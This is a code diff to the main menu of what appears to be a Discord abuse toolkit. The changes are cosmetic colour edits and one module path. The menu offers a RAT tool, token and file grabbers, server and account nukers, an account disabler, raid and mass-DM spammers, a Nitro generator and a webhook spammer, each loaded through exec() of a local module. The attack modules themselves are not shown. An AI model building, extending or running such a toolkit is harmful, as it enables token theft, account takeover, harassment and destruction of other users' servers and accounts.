@@ -6,16 +6,16 @@ def main():
     clear()
     setTitle(f"{name} MENU v{THIS_VERSION}")
     astraahometitle()
-    print(f"""{y}[{b}+{y}]{w} Main options:           {y}[{b}+{y}]{w} Grabber Options:         {y}[{b}+{y}]{w} Token Options:            {y}[{b}+{y}]{w} Useful Options:
+    print(f"""{y}[{r}+{y}]{w} Main options:           {y}[{r}+{y}]{w} Grabber Options:         {y}[{r}+{y}]{w} Token Options:            {y}[{r}+{y}]{w} Useful Options:
 \n{y}[{w}01{y}]{w} Self Bot               {y}[{w}06{y}]{w} File                    {y}[{w}09{y}]{w} Account Nuker            {y}[{w}15{y}]{w} Tokens Checker
 \n{y}[{w}02{y}]{w} RAT Tool               {y}[{w}07{y}]{w} Image                   {y}[{w}10{y}]{w} Account Disabler         {y}[{w}16{y}]{w} Clear DM
 \n{y}[{w}03{y}]{w} Raid Tool              {y}[{w}08{y}]{w} QrCode                  {y}[{w}11{y}]{w} Account Generator        {y}[{w}17{y}]{w} House Changer
 \n{y}[{w}04{y}]{w} Server Nuker                                        {y}[{w}12{y}]{w} Settings Cycler          {y}[{w}18{y}]{w} Statue Changer
 \n{y}[{w}05{y}]{w} VideoCrash Maker                                    {y}[{w}13{y}]{w} Token Informations       {y}[{w}19{y}]{w} Mass DM
 \n                                                         {y}[{w}14{y}]{w} AutoLogin                {y}[{w}20{y}]{w} Group Spammer          
-\t\t\t\t\t\t\t\t\t\t\t\t\t {y}[{b}>{y}]{w} Next Page""")
+\n\t\t\t\t\t\t\t\t\t\t\t\t\t {y}[{r}>{y}]{w} Next Page""")
     global choice
-    choice = input(f"""{y}[{b}#{y}]{w} Choice: """)
+    choice = input(f"""{y}[{g}#{y}]{w} Choice: """)
 
     if choice == '1' or choice == '01':
         transition()
@@ -62,7 +62,7 @@ def main():
         main()
     elif choice == '12':
         transition()
-        exec(open('util/12_SettingsCycler/settingscycler.py').read())
+        exec(open('util/cycler/settingscycler.py').read())
     elif choice == '13':
         transition()
         exec(open('util/13_TokenInfo/tokeninfo.py').read())
@@ -90,10 +90,10 @@ def main():
     elif choice == '>':
         clear()
         astraahometitle()
-        print(f"""      {y}[{b}+{y}]{w} Nitro Options:          {y}[{b}+{y}]{w} WebHooks Options:        {y}[{b}+{y}]{w} Other Options:
+        print(f"""      {y}[{r}+{y}]{w} Nitro Options:          {y}[{r}+{y}]{w} WebHooks Options:        {y}[{r}+{y}]{w} Other Options:
 \n          {y}[{w}21{y}]{w} Generator              {y}[{w}22{y}]{w} Spammer                 {y}[{w}24{y}]{w} Credits
-\n                                      {y}[{w}23{y}]{w} Remover                 {y}[{w}25{y}]{w} Exit\n\n\n\n\n\n\n\n\n\n                                                                                                     {y}[{b}<{y}]{w} Previous Page""")
-        choice = input(f"""{y}[{b}#{y}]{w} Choice: """)
+\n                                      {y}[{w}23{y}]{w} Remover                 {y}[{w}25{y}]{w} Exit\n\n\n\n\n\n                                                                                                     {y}[{b}<{y}]{w} Previous Page""")
+        choice = input(f"""{y}[{g}#{y}]{w} Choice: """)
 
     if choice == '21':
         transition()
